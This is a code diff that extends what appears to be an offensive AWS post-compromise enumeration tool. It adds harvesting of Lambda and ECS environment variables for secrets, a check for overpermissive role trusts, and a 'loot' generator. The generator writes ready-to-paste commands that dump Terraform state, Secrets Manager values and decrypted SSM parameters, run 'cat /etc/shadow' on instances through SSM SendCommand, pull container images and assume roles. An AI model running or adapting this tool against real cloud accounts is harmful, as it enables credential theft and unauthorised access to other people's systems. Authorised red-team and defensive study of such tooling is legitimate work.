@@ -1181,6 +1181,266 @@ def check_logs(key_id, secret, token, region, timeout):
             "log_groups": [g["logGroupName"] for g in result.get("logGroups", [])]}
 
 
+# ─── New Checks: Env Vars, Role Trusts, Loot ─────────────────────────────────
+
+def check_env_vars(key_id, secret, token, region, timeout):
+    """Extract environment variables from Lambda, ECS task defs — credential goldmine."""
+    result = {"lambda": [], "ecs": []}
+
+    # Lambda env vars
+    lam = make_client("lambda", key_id, secret, token, region, timeout)
+    try:
+        paginator = lam.get_paginator("list_functions")
+        for page in paginator.paginate():
+            for fn in page.get("Functions", []):
+                env = fn.get("Environment", {}).get("Variables", {})
+                if env:
+                    # Flag interesting vars
+                    interesting = {k: v for k, v in env.items()
+                                   if any(kw in k.upper() for kw in
+                                          ["KEY", "SECRET", "PASSWORD", "TOKEN", "API",
+                                           "CREDENTIAL", "AUTH", "DB", "DATABASE", "CONN",
+                                           "PRIVATE", "ACCESS"])}
+                    result["lambda"].append({
+                        "function": fn["FunctionName"],
+                        "role": fn.get("Role", ""),
+                        "runtime": fn.get("Runtime", ""),
+                        "env_count": len(env),
+                        "interesting": interesting,
+                        "all_vars": env,
+                    })
+    except Exception:
+        r, _ = safe(lam.list_functions)
+        if r:
+            for fn in r.get("Functions", []):
+                env = fn.get("Environment", {}).get("Variables", {})
+                if env:
+                    result["lambda"].append({
+                        "function": fn["FunctionName"],
+                        "env_count": len(env),
+                        "all_vars": env,
+                    })
+
+    # ECS task definition env vars
+    ecs = make_client("ecs", key_id, secret, token, region, timeout)
+    task_defs, _ = safe(ecs.list_task_definitions, status="ACTIVE")
+    if task_defs:
+        for arn in task_defs.get("taskDefinitionArns", [])[:20]:
+            td, _ = safe(ecs.describe_task_definition, taskDefinition=arn)
+            if td:
+                for container in td.get("taskDefinition", {}).get("containerDefinitions", []):
+                    env = container.get("environment", [])
+                    secrets_refs = container.get("secrets", [])
+                    if env or secrets_refs:
+                        env_dict = {e["name"]: e["value"] for e in env}
+                        interesting = {k: v for k, v in env_dict.items()
+                                       if any(kw in k.upper() for kw in
+                                              ["KEY", "SECRET", "PASSWORD", "TOKEN", "API",
+                                               "CREDENTIAL", "AUTH", "DB", "CONN", "PRIVATE"])}
+                        result["ecs"].append({
+                            "task_def": arn.split("/")[-1],
+                            "container": container.get("name"),
+                            "role": td.get("taskDefinition", {}).get("taskRoleArn", ""),
+                            "env_count": len(env),
+                            "secret_refs": len(secrets_refs),
+                            "interesting": interesting,
+                            "all_vars": env_dict,
+                        })
+
+    return result
+
+
+def check_role_trusts(key_id, secret, token, region, timeout):
+    """Analyze IAM role trust policies for overpermissive or external trusts."""
+    client = make_client("iam", key_id, secret, token, region, timeout)
+    result = {"external_trusts": [], "wildcard_trusts": [], "service_trusts": [], "total_roles": 0}
+
+    roles, err = safe(client.list_roles, MaxItems=200)
+    if not roles:
+        return {"error": err}
+
+    all_roles = roles.get("Roles", [])
+    result["total_roles"] = len(all_roles)
+    own_account = None
+
+    for role in all_roles:
+        trust_doc = role.get("AssumeRolePolicyDocument", {})
+        role_name = role["RoleName"]
+        role_arn = role["Arn"]
+
+        # Extract account ID from role ARN
+        if own_account is None and "::" in role_arn:
+            own_account = role_arn.split(":")[4]
+
+        for stmt in trust_doc.get("Statement", []):
+            if stmt.get("Effect") != "Allow":
+                continue
+            principal = stmt.get("Principal", {})
+
+            # Wildcard trust — anyone can assume
+            if principal == "*" or principal == {"AWS": "*"}:
+                result["wildcard_trusts"].append({
+                    "role": role_name,
+                    "arn": role_arn,
+                    "condition": stmt.get("Condition", {}),
+                })
+                continue
+
+            # Check AWS principals
+            aws_principals = principal.get("AWS", [])
+            if isinstance(aws_principals, str):
+                aws_principals = [aws_principals]
+            for p in aws_principals:
+                if own_account and own_account not in p and p != "*":
+                    result["external_trusts"].append({
+                        "role": role_name,
+                        "arn": role_arn,
+                        "external_principal": p,
+                        "condition": stmt.get("Condition", {}),
+                    })
+
+            # Service trusts
+            svc_principals = principal.get("Service", [])
+            if isinstance(svc_principals, str):
+                svc_principals = [svc_principals]
+            for svc in svc_principals:
+                result["service_trusts"].append({
+                    "role": role_name,
+                    "service": svc,
+                })
+
+    return result
+
+
+def generate_loot(result, out_dir, account_id):
+    """Generate ready-to-execute commands for all enumerated resources."""
+    loot_lines = []
+    loot_lines.append(f"# AWS Loot — Account {account_id}")
+    loot_lines.append(f"# Generated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
+    loot_lines.append(f"# Paste these commands to exploit enumerated resources\n")
+
+    # S3 buckets
+    s3 = result.get("s3", {})
+    if s3.get("all"):
+        loot_lines.append("# ── S3 Buckets ─────────────────────────────────────────")
+        for b in s3["all"]:
+            loot_lines.append(f"aws s3 ls s3://{b}/ --max-items 20")
+        loot_lines.append("")
+        if s3.get("terraform_buckets"):
+            loot_lines.append("# Terraform state (may contain secrets):")
+            for b in s3["terraform_buckets"]:
+                loot_lines.append(f"aws s3 cp s3://{b}/ ./{b}/ --recursive --include '*.tfstate'")
+            loot_lines.append("")
+
+    # EC2 instances — SSM sessions
+    for region, ssm_data in result.get("ssm", {}).items():
+        if isinstance(ssm_data, dict) and ssm_data.get("managed_instances"):
+            loot_lines.append(f"# ── SSM Sessions ({region}) ──────────────────────────────")
+            for inst in ssm_data["managed_instances"]:
+                loot_lines.append(f"aws ssm start-session --target {inst['id']} --region {region}  # {inst.get('platform','')} {inst.get('ip','')}")
+            sc = ssm_data.get("send_command_access", "")
+            if "ALLOWED" in str(sc):
+                loot_lines.append(f"\n# RCE via SendCommand ({region}):")
+                for inst in ssm_data["managed_instances"]:
+                    loot_lines.append(f"aws ssm send-command --instance-ids {inst['id']} --document-name AWS-RunShellScript --parameters commands='id && whoami && cat /etc/shadow' --region {region}")
+            loot_lines.append("")
+
+    # EKS clusters
+    eks = result.get("eks", {})
+    cluster_regions = {k: v for k, v in eks.items() if not k.endswith("_details")}
+    if cluster_regions:
+        loot_lines.append("# ── EKS Clusters ───────────────────────────────────────")
+        for region, clusters in cluster_regions.items():
+            for c in clusters:
+                loot_lines.append(f"aws eks update-kubeconfig --name {c} --region {region}")
+                loot_lines.append(f"kubectl get pods --all-namespaces  # after kubeconfig update")
+        loot_lines.append("")
+
+    # ECR repos
+    for region, ecr_data in result.get("ecr", {}).items():
+        if isinstance(ecr_data, dict) and ecr_data.get("repos"):
+            loot_lines.append(f"# ── ECR Repos ({region}) ────────────────────────────────")
+            loot_lines.append(f"aws ecr get-login-password --region {region} | docker login --username AWS --password-stdin {account_id}.dkr.ecr.{region}.amazonaws.com")
+            for repo in ecr_data["repos"][:10]:
+                loot_lines.append(f"docker pull {repo.get('uri','')}:latest")
+            loot_lines.append("")
+
+    # RDS instances
+    for region, rds_data in result.get("rds", {}).items():
+        if isinstance(rds_data, dict) and rds_data.get("instances"):
+            loot_lines.append(f"# ── RDS Databases ({region}) ────────────────────────────")
+            for db in rds_data["instances"]:
+                endpoint = db.get("endpoint", "")
+                port = db.get("port", "")
+                engine = db.get("engine", "")
+                if "mysql" in engine.lower():
+                    loot_lines.append(f"mysql -h {endpoint} -P {port} -u admin -p  # {db['id']}")
+                elif "postgres" in engine.lower():
+                    loot_lines.append(f"psql -h {endpoint} -p {port} -U postgres  # {db['id']}")
+                else:
+                    loot_lines.append(f"# {db['id']}: {engine} @ {endpoint}:{port}")
+            loot_lines.append("")
+
+    # Lambda functions — download code
+    for region, lam_data in result.get("lambda", {}).items():
+        if isinstance(lam_data, dict) and lam_data.get("functions"):
+            loot_lines.append(f"# ── Lambda Functions ({region}) ─────────────────────────")
+            for fn in lam_data["functions"][:10]:
+                loot_lines.append(f"aws lambda get-function --function-name {fn['name']} --region {region} --query 'Code.Location' --output text | xargs curl -o {fn['name']}.zip")
+            loot_lines.append("")
+
+    # Secrets Manager
+    for region, sm_data in result.get("secrets_manager", {}).items():
+        if isinstance(sm_data, dict) and sm_data.get("secret_names"):
+            loot_lines.append(f"# ── Secrets Manager ({region}) ─────────────────────────")
+            for name in sm_data["secret_names"][:20]:
+                loot_lines.append(f"aws secretsmanager get-secret-value --secret-id '{name}' --region {region}")
+            loot_lines.append("")
+
+    # SSM Parameters
+    for region, ssm_data in result.get("ssm", {}).items():
+        if isinstance(ssm_data, dict) and ssm_data.get("parameter_names"):
+            secure = [n for n in ssm_data["parameter_names"]
+                      if ssm_data.get("secure_string_count", 0) > 0]
+            if ssm_data["parameter_names"]:
+                loot_lines.append(f"# ── SSM Parameters ({region}) ──────────────────────────")
+                for name in ssm_data["parameter_names"][:20]:
+                    loot_lines.append(f"aws ssm get-parameter --name '{name}' --with-decryption --region {region}")
+                loot_lines.append("")
+
+    # Env vars with interesting findings
+    env_vars = result.get("env_vars", {})
+    for region, ev_data in env_vars.items() if isinstance(env_vars, dict) else []:
+        if isinstance(ev_data, dict):
+            for fn_data in ev_data.get("lambda", []):
+                if fn_data.get("interesting"):
+                    loot_lines.append(f"# ── Lambda Env Vars: {fn_data['function']} ({region}) ──")
+                    for k, v in fn_data["interesting"].items():
+                        loot_lines.append(f"#   {k}={v}")
+                    loot_lines.append("")
+
+    # Role assumption commands
+    role_trusts = result.get("role_trusts", {})
+    if role_trusts.get("wildcard_trusts"):
+        loot_lines.append("# ── Wildcard Trust Roles (anyone can assume) ─────────")
+        for rt in role_trusts["wildcard_trusts"]:
+            loot_lines.append(f"aws sts assume-role --role-arn {rt['arn']} --role-session-name pwn")
+        loot_lines.append("")
+    if role_trusts.get("external_trusts"):
+        loot_lines.append("# ── External Trust Roles (cross-account) ─────────────")
+        for rt in role_trusts["external_trusts"][:10]:
+            loot_lines.append(f"# {rt['role']} trusts {rt['external_principal']}")
+            loot_lines.append(f"aws sts assume-role --role-arn {rt['arn']} --role-session-name pwn")
+        loot_lines.append("")
+
+    # Write loot file
+    loot_path = os.path.join(out_dir, f"loot_{account_id}.sh")
+    with open(loot_path, "w") as f:
+        f.write("\n".join(loot_lines) + "\n")
+
+    return loot_path
+
+
 def try_assume_role(key_id, secret, token, region, timeout, role_name, account_id):
     """Try to assume a single role, return credentials tuple or None"""
     sts = make_client("sts", key_id, secret, token, region, timeout)
@@ -1863,8 +2123,82 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
     else:
         print(f"{ts()}   ✗ {org['error']}", flush=True)
 
-    # Role assumption enumeration is handled in [1b] — creds already swapped if successful.
-    # All steps [2]-[13] above ran with the assumed role creds.
+    # [14] Environment variables (Lambda + ECS)
+    print(f"{ts()} [14] Environment variables (all {len(regions)} regions)...", flush=True)
+    result["env_vars"] = {}
+    env_total_lambda = 0
+    env_total_ecs = 0
+    env_interesting = 0
+    for r in regions:
+        ev = check_env_vars(key_id, secret, token, r, timeout)
+        if ev.get("lambda") or ev.get("ecs"):
+            result["env_vars"][r] = ev
+            env_total_lambda += len(ev.get("lambda", []))
+            env_total_ecs += len(ev.get("ecs", []))
+            for fn_data in ev.get("lambda", []):
+                if fn_data.get("interesting"):
+                    env_interesting += len(fn_data["interesting"])
+                    print(f"{ts()}   {r}: Lambda {fn_data['function']} — {len(fn_data['interesting'])} interesting vars", flush=True)
+                    for k, v in list(fn_data["interesting"].items())[:3]:
+                        print(f"{ts()}     {k}={v[:50]}{'...' if len(str(v)) > 50 else ''}", flush=True)
+            for td_data in ev.get("ecs", []):
+                if td_data.get("interesting"):
+                    env_interesting += len(td_data["interesting"])
+                    print(f"{ts()}   {r}: ECS {td_data['task_def']}/{td_data['container']} — {len(td_data['interesting'])} interesting vars", flush=True)
+    if env_total_lambda == 0 and env_total_ecs == 0:
+        print(f"{ts()}   No env vars accessible", flush=True)
+    else:
+        print(f"{ts()}   Total: {env_total_lambda} Lambda, {env_total_ecs} ECS — {env_interesting} interesting vars", flush=True)
+
+    # Save env vars to file if any found
+    if result["env_vars"]:
+        env_file = os.path.join(out_dir, f"env_vars_{account_id}.txt")
+        with open(env_file, "w") as f:
+            f.write(f"Environment Variables — Account {account_id}\n")
+            f.write("=" * 60 + "\n\n")
+            for region, ev in result["env_vars"].items():
+                for fn_data in ev.get("lambda", []):
+                    f.write(f"[Lambda] {fn_data['function']} ({region})\n")
+                    f.write(f"  Role: {fn_data.get('role', 'N/A')}\n")
+                    for k, v in fn_data.get("all_vars", {}).items():
+                        marker = " <<<" if k in fn_data.get("interesting", {}) else ""
+                        f.write(f"  {k}={v}{marker}\n")
+                    f.write("\n")
+                for td_data in ev.get("ecs", []):
+                    f.write(f"[ECS] {td_data['task_def']}/{td_data['container']} ({region})\n")
+                    f.write(f"  Role: {td_data.get('role', 'N/A')}\n")
+                    for k, v in td_data.get("all_vars", {}).items():
+                        marker = " <<<" if k in td_data.get("interesting", {}) else ""
+                        f.write(f"  {k}={v}{marker}\n")
+                    f.write("\n")
+        print(f"{ts()}   Env vars saved → {env_file}", flush=True)
+
+    # [15] Role trust analysis
+    print(f"{ts()} [15] Role trust analysis...", flush=True)
+    role_trusts = check_role_trusts(key_id, secret, token, region, timeout)
+    result["role_trusts"] = role_trusts
+    if "error" not in role_trusts:
+        print(f"{ts()}   Total roles    : {role_trusts['total_roles']}", flush=True)
+        if role_trusts.get("wildcard_trusts"):
+            print(f"{ts()}   ⚠ WILDCARD    : {len(role_trusts['wildcard_trusts'])} roles (anyone can assume!)", flush=True)
+            for wt in role_trusts["wildcard_trusts"][:5]:
+                cond = " (with conditions)" if wt.get("condition") else " (NO conditions!)"
+                print(f"{ts()}     {wt['role']}{cond}", flush=True)
+        if role_trusts.get("external_trusts"):
+            print(f"{ts()}   ⚠ EXTERNAL    : {len(role_trusts['external_trusts'])} roles trust external accounts", flush=True)
+            for et in role_trusts["external_trusts"][:5]:
+                print(f"{ts()}     {et['role']} ← {et['external_principal']}", flush=True)
+            if len(role_trusts["external_trusts"]) > 5:
+                print(f"{ts()}     ... and {len(role_trusts['external_trusts'])-5} more", flush=True)
+        if not role_trusts.get("wildcard_trusts") and not role_trusts.get("external_trusts"):
+            print(f"{ts()}   No overpermissive trusts found", flush=True)
+    else:
+        print(f"{ts()}   ✗ {role_trusts['error']}", flush=True)
+
+    # [16] Loot generation
+    print(f"{ts()} [16] Generating loot...", flush=True)
+    loot_path = generate_loot(result, out_dir, account_id)
+    print(f"{ts()}   ✓ Loot file → {loot_path}", flush=True)
 
     return result
 
